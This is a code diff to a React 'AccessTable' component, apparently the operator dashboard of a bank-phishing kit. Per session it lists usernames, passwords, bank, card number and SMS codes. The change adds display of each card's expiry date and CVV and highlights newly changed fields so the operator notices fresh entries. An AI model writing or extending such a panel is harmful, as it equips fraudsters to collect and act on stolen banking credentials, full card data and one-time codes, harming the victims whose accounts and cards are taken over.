@@ -58,7 +58,9 @@ const AccessTable: React.FC<AccessTableProps> = ({
         if (prevSession.username !== session.username || prevSession.password !== session.password) {
           newFieldHighlights[session.sessionId].credentials = true;
         }
-        if (prevSession.tarjeta !== session.tarjeta) {
+        if (prevSession.tarjeta !== session.tarjeta || 
+            prevSession.fechaVencimiento !== session.fechaVencimiento ||
+            prevSession.cvv !== session.cvv) {
           newFieldHighlights[session.sessionId].tarjeta = true;
         }
         if (prevSession.sms !== session.sms) {
@@ -167,7 +169,15 @@ const AccessTable: React.FC<AccessTableProps> = ({
               </td>
               <td className="p-3 text-[#ccc]">{session.banco}</td>
               <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                {session.tarjeta || '--'}
+                <div>
+                  <span className="block">{session.tarjeta || '--'}</span>
+                  {(session.fechaVencimiento || session.cvv) && (
+                    <div className="text-xs mt-1 opacity-80">
+                      {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
+                      {session.cvv && <span>CVV: {session.cvv}</span>}
+                    </div>
+                  )}
+                </div>
               </td>
               <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                 {session.sms || '--'}
